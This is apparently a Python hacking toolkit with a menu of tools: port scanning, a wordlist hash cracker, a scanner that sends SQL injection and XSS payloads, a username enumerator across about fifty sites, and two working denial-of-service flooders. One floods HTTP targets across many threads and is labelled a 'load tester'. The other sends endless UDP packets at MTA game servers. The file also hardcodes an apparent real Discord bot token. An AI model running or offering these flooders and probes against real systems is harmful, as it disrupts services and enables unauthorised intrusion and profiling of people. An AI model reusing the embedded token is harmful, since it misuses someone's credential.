import os
import re
import socket
import requests
import time
import random
import string
import base64
import hashlib
import threading  # Added missing import
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
    " Version/15.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
    " Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"
    " Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0"
]

BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN", "MTM1Mzc0OTQ4MTk3OTY0NTk1Mw.G2VqN_.DOU7bAKsYl8EXEgaiHa8GnE_USXBDuFeRCzS2A")  # Use environment variable for security

# ─────────────── Utilities ───────────────
def clear():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        pass  # Silently ignore if clear fails

def print_header():
    print("="*60)
    print(r"""    
███╗   ███╗    ███████╗    ██████╗      ██████╗ 
████╗ ████║    ██╔════╝    ██╔══██╗    ██╔═══██╗
██╔████╔██║    █████╗      ██║  ██║    ██║   ██║
██║╚██╔╝██║    ██╔══╝      ██║  ██║    ██║   ██║
██║ ╚═╝ ██║    ███████╗    ██████╔╝    ╚██████╔╝
╚═╝     ╚═╝    ╚══════╝    ╚═════╝      ╚═════╝     
            Created by Mohammad Salem       
    """)
    print("="*60)

# ─────────────── IP Tools ───────────────
def geo_ip(ip):
    try:
        print("\n[+] Getting IP information...")
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        response.raise_for_status()
        data = response.json()
        for key, value in data.items():
            print(f"{key.capitalize()}: {value}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to retrieve IP information: {e}")

def scan_ports(ip):
    try:
        socket.inet_aton(ip)  # Validate IPv4 address
    except socket.error:
        print(f"[-] Invalid IP address: {ip}")
        return
    print(f"\n[+] Scanning common ports on {ip}...")
    common_ports = {
        21: "FTP",
        22: "SSH",
        23: "Telnet",
        25: "SMTP",
        53: "DNS",
        80: "HTTP",
        110: "POP3",
        443: "HTTPS",
        445: "SMB",
        3306: "MySQL",
        8080: "HTTP Proxy"
    }

    vulnerabilities = {
        21: "FTP may allow anonymous login.",
        23: "Telnet sends data in plain text.",
        445: "SMB may be vulnerable to EternalBlue.",
        3306: "MySQL may be exposed with weak credentials.",
        8080: "Often misconfigured and open to attacks."
    }

    for port, name in common_ports.items():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)  # Increased timeout
        result = sock.connect_ex((ip, port))
        if result == 0:
            print(f"[OPEN] Port {port} ({name})")
            if port in vulnerabilities:
                print(f"    [!] Potential Vulnerability: {vulnerabilities[port]}")
        sock.close()

def local_device_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    print(f"\n[+] Local Device Info\nHostname: {hostname}\nLocal IP: {ip_address}")

def ip_section():
    clear()
    print_header()
    ip = input("[?] Enter an IP address (or type 'localhost'): ").strip()
    if ip.lower() == "localhost":
        ip = socket.gethostbyname(socket.gethostname())

    while True:
        print("\n[ MENU - IP TOOLS ]")
        print("1. Get IP Information")
        print("2. Scan Open Ports")
        print("3. Local Device Info")
        print("0. Back")
        choice = input("[*] Choose: ")

        if choice == '1':
            geo_ip(ip)
        elif choice == '2':
            scan_ports(ip)
        elif choice == '3':
            local_device_info()
        elif choice == '0':
            break
        input("\n[Press Enter to continue...]")
        clear()
        print_header()

# ─────────────── URL Tools ───────────────
def check_url_status(url):
    try:
        print(f"\n[+] Checking status of: {url}")
        r = requests.get(url, timeout=5)
        print(f"Status Code: {r.status_code} - {'Reachable' if r.ok else 'Unreachable'}")
    except requests.exceptions.RequestException:
        print("[-] Failed to reach the URL.")

def expand_short_url(url):
    try:
        print(f"\n[+] Expanding short URL: {url}")
        r = requests.head(url, allow_redirects=True, timeout=5)
        print(f"Final URL: {r.url}")
    except requests.exceptions.RequestException:
        print("[-] Failed to expand URL.")

def url_section():
    clear()
    print_header()
    url = input("[?] Enter a URL: ").strip()

    while True:
        print("\n[ MENU - URL TOOLS ]")
        print("1. Check URL Status")
        print("2. Expand Short URL")
        print("0. Back")
        choice = input("[*] Choose: ")

        if choice == '1':
            check_url_status(url)
        elif choice == '2':
            expand_short_url(url)
        elif choice == '0':
            break
        input("\n[Press Enter to continue...]")
        clear()
        print_header()
        
        

# ─────────────── Password Generator ───────────────
def generate_password(length=16, use_special=True):
    chars = string.ascii_letters + string.digits
    if use_special:
        chars += string.punctuation
    return ''.join(random.choice(chars) for _ in range(length))

def check_password_strength(password):
    length = len(password)
    has_upper = any(c.isupper() for c in password)
    has_lower = any(c.islower() for c in password)
    has_digit = any(c.isdigit() for c in password)
    has_special = any(c in string.punctuation for c in password)

    score = 0
    if length >= 8:
        score += 1
    if length >= 12:
        score += 1
    if has_upper and has_lower:
        score += 1
    if has_digit:
        score += 1
    if has_special:
        score += 1

    strength = {
        0: "Very Weak",
        1: "Weak",
        2: "Moderate",
        3: "Strong",
        4: "Very Strong",
        5: "Excellent"
    }

    return strength.get(score, "Unknown")

def check_pwned_password(password):
    sha1pass = hashlib.sha1(password.encode('utf-8')).hexdigest().upper()
    prefix = sha1pass[:5]
    suffix = sha1pass[5:]

    url = f"https://api.pwnedpasswords.com/range/{prefix}"
    try:
        res = requests.get(url, timeout=5)
        res.raise_for_status()
        hashes = (line.split(':') for line in res.text.splitlines())
        for h, count in hashes:
            if h == suffix:
                return int(count)
        return 0
    except requests.exceptions.RequestException:
        return None

def password_section():
    clear()
    print_header()
    print("[1] Generate new password")
    print("[2] Check existing password")
    choice = input("[?] Choose an option (1/2): ").strip()
    if choice not in ['1', '2']:
        print("[-] Invalid option.")
        input("\n[Press Enter to return...]")
        return

    if choice == '1':
        try:
            length = input("[?] Password length (min 8): ").strip()
            if not length.isdigit() or int(length) < 8:
                print("[-] Length must be a number >= 8.")
                input("\n[Press Enter to return...]")
                return
            length = int(length)
            special = input("[?] Include symbols? (y/n): ").lower() == 'y'
            pwd = generate_password(length, special)
            print("\n[+] Generated Password:")
            print(pwd)

            strength = check_password_strength(pwd)
            print(f"[+] Password Strength: {strength}")

            pwned_count = check_pwned_password(pwd)
            if pwned_count is None:
                print("[-] Could not check password breach status.")
            elif pwned_count > 0:
                print(f"[-] WARNING: This password has appeared {pwned_count} times in data breaches!")
            else:
                print("[✓] This password has NOT been found in known data breaches.")
        except Exception as e:
            print(f"[-] Error: {e}")

    elif choice == '2':
        pwd = input("[?] Enter the password to check: ").strip()
        if not pwd:
            print("[-] Password cannot be empty.")
            input("\n[Press Enter to return...]")
            return

        strength = check_password_strength(pwd)
        print(f"\n[+] Password Strength: {strength}")

        pwned_count = check_pwned_password(pwd)
        if pwned_count is None:
            print("[-] Could not check password breach status.")
        elif pwned_count > 0:
            print(f"[-] WARNING: This password has appeared {pwned_count} times in data breaches!")
        else:
            print("[✓] This password has NOT been found in known data breaches.")

    input("\n[Press Enter to return...]")

# ─────────────── Discord Info Tools ───────────────
import requests
import re

flags_map = {
    1 << 0: "Discord Employee",
    1 << 1: "Partnered Server Owner",
    1 << 2: "HypeSquad Events",
    1 << 3: "Bug Hunter Level 1",
    1 << 6: "House Bravery",
    1 << 7: "House Brilliance",
    1 << 8: "House Balance",
    1 << 9: "Early Supporter",
    1 << 14: "Bug Hunter Level 2",
    1 << 17: "Verified Bot",
    1 << 18: "Early Verified Bot Developer",
    1 << 19: "Discord Certified Moderator"
}

def decode_flags(flags_int):
    flags = []
    for flag_val, flag_name in flags_map.items():
        if flags_int & flag_val:
            flags.append(flag_name)
    return flags if flags else ["No special flags"]

def discord_info_section():
    clear()
    print_header()
    
    user_id = input("[+] Enter Discord User ID: ").strip()
    if not re.fullmatch(r"\d{17,20}", user_id):
        print("[-] Invalid User ID format.")
        input("\n[Press Enter to return to menu...]")
        return
    
    headers = {"Authorization": f"Bot {BOT_TOKEN}"}
    
    try:
        url = f"https://discord.com/api/v10/users/{user_id}"
        res = requests.get(url, headers=headers, timeout=5)
        
        if res.status_code == 200:
            data = res.json()
            print("[✓] User Info:")
            print(f"Username: {data.get('username')}#{data.get('discriminator')}")
            print(f"ID: {data.get('id')}")
            print(f"Bot Account: {data.get('bot', False)}")
            print(f"MFA Enabled: {data.get('mfa_enabled', False)}")
            print(f"Locale: {data.get('locale', 'N/A')}")
            print(f"Verified Email: {data.get('verified', False)}")
            # إزالة البريد الإلكتروني لانه يتطلب صلاحيات خاصة
            # print(f"Email: {data.get('email') or 'Not Available'}")  # حذف
            premium_type_map = {
                0: "None",
                1: "Nitro Classic",
                2: "Nitro"
            }
            premium_type = premium_type_map.get(data.get('premium_type', 0), "Unknown")
            print(f"Premium Type: {premium_type}")
            
            flags_int = data.get("flags", 0)
            flags_list = decode_flags(flags_int)
            print(f"Flags: {', '.join(flags_list)}")
        else:
            print(f"[-] Failed to get user info. Status Code: {res.status_code}")
            if res.status_code == 401:
                print("[-] Unauthorized - Invalid BOT_TOKEN or missing permissions.")
            elif res.status_code == 404:
                print("[-] User not found or bot does not share a server with the user.")
            else:
                print(f"[-] Response: {res.text}")
    except requests.exceptions.RequestException as e:
        print(f"[-] Network error or timeout: {e}")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    
    input("\n[Press Enter to return to menu...]")


# ─────────────── Hash Cracker ───────────────
def hash_cracker_section():
    clear()
    print_header()
    
    hash_input = input("[+] Enter hash: ").strip()
    wordlist_path = input("[+] Enter wordlist path: ").strip()

    if not os.path.isfile(wordlist_path):
        print(f"[-] Wordlist file '{wordlist_path}' not found.")
        input("\n[Press Enter to continue...]")
        return

    hash_types = {
        32: 'md5',
        40: 'sha1',
        64: 'sha256'
    }

    hash_type = hash_types.get(len(hash_input))
    if not hash_type:
        print("[-] Unsupported hash length. Please enter a valid MD5, SHA1, or SHA256 hash.")
        input("\n[Press Enter to continue...]")
        return

    print(f"[+] Detected hash type: {hash_type.upper()}")

    try:
        with open(wordlist_path, "r", errors='ignore') as f:
            for word in f:
                word = word.strip()
                if hash_type == 'md5':
                    hashed = hashlib.md5(word.encode()).hexdigest()
                elif hash_type == 'sha1':
                    hashed = hashlib.sha1(word.encode()).hexdigest()
                elif hash_type == 'sha256':
                    hashed = hashlib.sha256(word.encode()).hexdigest()

                if hashed == hash_input:
                    print(f"[✓] Match found: {word}")
                    input("\n[Press Enter to continue...]")
                    return
        print("[-] No match found in the wordlist.")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    input("\n[Press Enter to continue...]")

# ─────────────── Website Vulnerability Scanner ───────────────
def scan_sql_injection(url):
    vulnerable = False
    details = []
    payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users; --"]

    for payload in payloads:
        test_url = url + payload if '?' not in url else url.replace("=", f"={payload}", 1)
        try:
            res = requests.get(test_url, timeout=5)
            errors = ["sql syntax", "mysql", "syntax error", "unclosed quotation mark", "sqlite"]
            if any(err in res.text.lower() for err in errors):
                details.append(f"Payload '{payload}' triggered an error")
                vulnerable = True
        except Exception as e:
            details.append(f"Request failed for {test_url}: {e}")
    
    return {"vulnerable": vulnerable, "details": details}

def scan_xss(url):
    vulnerable = False
    details = []
    payload = "<script>alert('XSS')</script>"

    if '?' in url:
        base, query = url.split('?', 1)
        params = query.split('&')
        for i, param in enumerate(params):
            if '=' in param:
                key, val = param.split('=', 1)
                test_params = params.copy()
                test_params[i] = f"{key}={payload}"
                test_url = base + '?' + '&'.join(test_params)
                try:
                    res = requests.get(test_url, timeout=5)
                    if payload in res.text:
                        details.append(f"Parameter '{key}'")
                        vulnerable = True
                except Exception as e:
                    details.append(f"Request failed for {test_url}: {e}")
    else:
        test_url = url + payload
        try:
            res = requests.get(test_url, timeout=5)
            if payload in res.text:
                details.append("URL end injection")
                vulnerable = True
        except Exception as e:
            details.append(f"Request failed for {test_url}: {e}")

    return {"vulnerable": vulnerable, "details": details}

def scan_security_headers(url):
    try:
        res = requests.get(url, timeout=5)
        headers = res.headers

        security_headers = {
            "Content-Security-Policy": False,
            "X-Frame-Options": False,
            "X-XSS-Protection": False,
            "Strict-Transport-Security": False,
            "Referrer-Policy": False,
            "Permissions-Policy": False
        }

        for header in security_headers.keys():
            if header in headers:
                security_headers[header] = True

        return security_headers
    except Exception as e:
        return {"error": str(e)}

def print_report(url, sql_res, xss_res, headers_res):
    print("\n" + "="*40)
    print(f"Website Vulnerability Scan Report for: {url}")
    print("="*40)

    print("\n[SQL Injection Test]")
    if sql_res["vulnerable"]:
        print("  [+] Vulnerable!")
        for detail in sql_res["details"]:
            print(f"    - {detail}")
    else:
        print("  [-] No vulnerabilities detected.")

    print("\n[XSS Test]")
    if xss_res["vulnerable"]:
        print("  [+] Vulnerable!")
        for detail in xss_res["details"]:
            print(f"    - {detail}")
    else:
        print("  [-] No vulnerabilities detected.")

    print("\n[Security Headers Check]")
    if "error" in headers_res:
        print(f"  [-] Failed to fetch headers: {headers_res['error']}")
    else:
        for header, present in headers_res.items():
            status = "[OK]" if present else "[MISSING]"
            print(f"  {status} {header}")

    print("\n" + "="*40 + "\n")

def website_vuln_section():
    clear()
    print_header()
    url = input("[?] Enter the full website URL (with http/https): ").strip()

    print("\n[*] Starting Website Vulnerability Scan...\n")

    sql_res = scan_sql_injection(url)
    xss_res = scan_xss(url)
    headers_res = scan_security_headers(url)

    print_report(url, sql_res, xss_res, headers_res)

    print("[✓] Scan completed.\n")
    input("[Press Enter to return to menu...]")

# ─────────────── HTTP Flooder ───────────────
def generate_headers():  # Added missing function
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }

def flood(url, thread_id, requests_count):
    session = requests.Session()
    for i in range(requests_count):
        headers = generate_headers()
        try:
            res = session.get(url, headers=headers, timeout=5, verify=False)
            print(f"[Thread {thread_id}] Request {i+1} Status: {res.status_code}")
        except Exception as e:
            print(f"[Thread {thread_id}] Request {i+1} Failed: {e}")

def http_flooder_section():
    clear()
    print_header()
    print("HTTP Flooder - Legitimate Load Tester\n")
    url = input("[?] Enter target URL (with http/https): ").strip()
    try:
        threads = int(input("[?] Enter number of threads (e.g. 100): ").strip())
        if threads <= 0:
            threads = 100
    except:
        threads = 100
    try:
        reqs_per_thread = int(input("[?] Enter requests per thread (e.g. 1000): ").strip())
        if reqs_per_thread <= 0:
            reqs_per_thread = 1000
    except:
        reqs_per_thread = 1000

    print(f"\n[+] Starting flood on {url} with {threads} threads, each sending {reqs_per_thread} requests...\n")
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=flood, args=(url, i+1, reqs_per_thread))
        t.daemon = True
        t.start()
        thread_list.append(t)

    for t in thread_list:
        t.join()

    print("\n[✓] Flood completed.")
    input("\n[Press Enter to return to menu...]")

# ─────────────── sherlock_section ───────────────
def check_username_on_site(site_name, url_pattern, username):
    url = url_pattern.format(username=username)
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return f"[+] {site_name}: Found at {url}"
        elif response.status_code == 404:
            return f"[-] {site_name}: Not Found"
        else:
            return f"[?] {site_name}: Unknown status ({response.status_code})"
    except requests.RequestException:
        return f"[!] {site_name}: Error connecting"

def sherlock_section():
    clear()
    print_header()
    username = input("[?] Enter username to check: ").strip()

    sites = {
    "GitHub": "https://github.com/{username}",
    "Twitter": "https://twitter.com/{username}",
    "Instagram": "https://www.instagram.com/{username}",
    "TikTok": "https://www.tiktok.com/@{username}",
    "Reddit": "https://www.reddit.com/user/{username}",
    "Pinterest": "https://www.pinterest.com/{username}",
    "Tumblr": "https://{username}.tumblr.com",
    "SoundCloud": "https://soundcloud.com/{username}",
    "Vimeo": "https://vimeo.com/{username}",
    "Steam": "https://steamcommunity.com/id/{username}",
    "Twitch": "https://www.twitch.tv/{username}",
    "Medium": "https://medium.com/@{username}",
    "Replit": "https://replit.com/@{username}",
    "Dev.to": "https://dev.to/{username}",
    "ProductHunt": "https://www.producthunt.com/@{username}",
    "Keybase": "https://keybase.io/{username}",
    "About.me": "https://about.me/{username}",
    "Behance": "https://www.behance.net/{username}",
    "GitLab": "https://gitlab.com/{username}",
    "CodePen": "https://codepen.io/{username}",
    "Flickr": "https://www.flickr.com/people/{username}",
    "500px": "https://500px.com/{username}",
    "Roblox": "https://www.roblox.com/user.aspx?username={username}",
    "Ask.fm": "https://ask.fm/{username}",
    "CashApp": "https://cash.app/${username}",
    "Blogger": "https://{username}.blogspot.com",
    "Patreon": "https://www.patreon.com/{username}",
    "Snapchat": "https://www.snapchat.com/add/{username}",
    "LinkedIn": "https://www.linkedin.com/in/{username}",
    "Facebook": "https://www.facebook.com/{username}",
    "YouTube": "https://www.youtube.com/@{username}",
    "Mix": "https://mix.com/{username}",
    "OkCupid": "https://www.okcupid.com/profile/{username}",
    "Etsy": "https://www.etsy.com/shop/{username}",
    "Dribbble": "https://dribbble.com/{username}",
    "AngelList": "https://angel.co/u/{username}",
    "Bandcamp": "https://{username}.bandcamp.com",
    "Bitbucket": "https://bitbucket.org/{username}",
    "Gitee": "https://gitee.com/{username}",
    "Kaggle": "https://www.kaggle.com/{username}",
    "Strava": "https://www.strava.com/athletes/{username}",
    "Fiverr": "https://www.fiverr.com/{username}",
    "Tripadvisor": "https://www.tripadvisor.com/Profile/{username}",
    "Wikia": "https://community.fandom.com/wiki/User:{username}",
    "Wattpad": "https://www.wattpad.com/user/{username}",
    "Codeforces": "https://codeforces.com/profile/{username}",
    "Hackerrank": "https://www.hackerrank.com/{username}",
    "LeetCode": "https://leetcode.com/{username}",
    "Unsplash": "https://unsplash.com/@{username}",
    "OpenSea": "https://opensea.io/{username}",
    "NameMC": "https://namemc.com/profile/{username}"
}


    results = []

    print(f"\n[+] Searching for username: {username}\n")
    for site, url in sites.items():
        result = check_username_on_site(site, url, username)
        print(result)
        results.append(result)

    try:
        with open("sherlock_results.txt", "w", encoding="utf-8") as f:
            for line in results:
                f.write(line + "\n")
        print("\n[✓] Results saved to 'sherlock_results.txt'")
    except Exception as e:
        print(f"\n[!] Failed to save results: {e}")

    input("\n[Press Enter to return to the menu...]")

# ─────────────── Flood Mta ───────────────
def flood_mta(server_ip, server_port, threads=100):
    def connect():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                message = b"\x00\xff\xff\xff\xff\xff\xff\xff"  
                s.sendto(message, (server_ip, server_port))
                s.close()
            except:
                pass

    for _ in range(threads):
        t = threading.Thread(target=connect)
        t.daemon = True
        t.start()

    input("[✓] Flood running... Press Enter to stop.\n")

def mta_flood_section():
    clear()
    print_header()
    print("[ MTA Flooder ]")
    print("⚠️ Use this only for protection testing or educational purposes!")

    ip = input("[?] Enter MTA server IP: ").strip()
    port = input("[?] Enter port (default is 22003): ").strip()
    port = int(port) if port else 22003
    threads = input("[?] Threads (default is 100): ").strip()
    threads = int(threads) if threads else 100

    
    if ip.startswith("mtasa://"):
        ip = ip[len("mtasa://"):]

    try:
        flood_mta(ip, port, threads)
    except Exception as e:
        print(f"[-] Error: {e}")
    
    input("\n[Press Enter to return to menu...]")


# ─────────────── Main Menu ───────────────
def main_menu():
    while True:
        try:
            clear()
            print_header()
            print("\n[ MAIN MENU ]")
            print("1. IP Tools")
            print("2. URL Tools")
            print("3. Password Generator")
            print("4. Discord Info Tools")
            print("5. Hash Cracker")
            print("6. Website Vulnerability Scanner")
            print("7. HTTP Flooder")
            print("8. Sherlock")
            print("9. MTA Flooder")
            print("0. Exit")
            choice = input("[*] Choose option: ")

            if choice == '1':
                ip_section()
            elif choice == '2':
                url_section()
            elif choice == '3':
                password_section()
            elif choice == '4':
                discord_info_section()
            elif choice == '5':
                hash_cracker_section()
            elif choice == '6':
                website_vuln_section()
            elif choice == '7':
                http_flooder_section()
            elif choice == '8':
                sherlock_section()  
            elif choice == '9':
                mta_flood_section()

            elif choice == '0':
                print("[✓] Exiting...")
                break
            else:
                print("[-] Invalid choice.")
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[✓] Exiting...")
            break
        except Exception as e:
            print(f"[-] An error occurred: {e}")
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
